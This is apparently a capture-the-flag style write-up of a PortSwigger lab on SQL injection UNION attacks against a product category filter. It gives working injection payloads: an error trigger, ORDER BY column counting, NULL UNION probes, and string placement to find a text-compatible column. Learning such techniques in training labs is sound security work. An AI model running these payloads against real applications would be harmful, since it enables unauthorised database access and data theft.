---
layout: post
title: "SQL injection UNION attack, finding a column containing text [Write-up]"
date: 2026-06-30
platform: portswigger
vulntype: sqli
difficulty: Medium
category: write-up
tags: [web]
---

## Overview

**Lab:** SQL injection UNION attack, finding a column containing text

**Platform:** PortSwigger

**Difficulty:** Medium  

---

# Description 

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

## Solution

Actually, the task is very simple, just like in the previous ones. Let's trigger an error to make sure the server responds to our request. 

```python
Pets'
```

Now that we've received a 500 response, we can proceed to list the columns in the table 

```python
Pets' ORDER BY 3 --

URL:
Pets'+ORDER+BY+1--   200
Pets'+ORDER+BY+2--   200
Pets'+ORDER+BY+3--   200
Pets'+ORDER+BY+4--   500
```

We have three columns. Let's check if UNION works by entering NULL in each column.

```python
Pets' UNION SELECT NULL,NULL,NULL --

URL:
Pets'+UNION+SELECT+NULL,NULL,NULL+--
```

We received a 200 response to this query, which means that the UNION is working; therefore, our next goal is to determine which column is accepting strings. 

We were given a string above that we need to include in the query; we'll try to find the column we need by trial and error. 

```python
Pets' UNION SELECT '0uXMdQ',NULL,NULL --       500
Pets' UNION SELECT NULL,'0uXMdQ',NULL --       200
```

And we managed to find the right column and complete the task
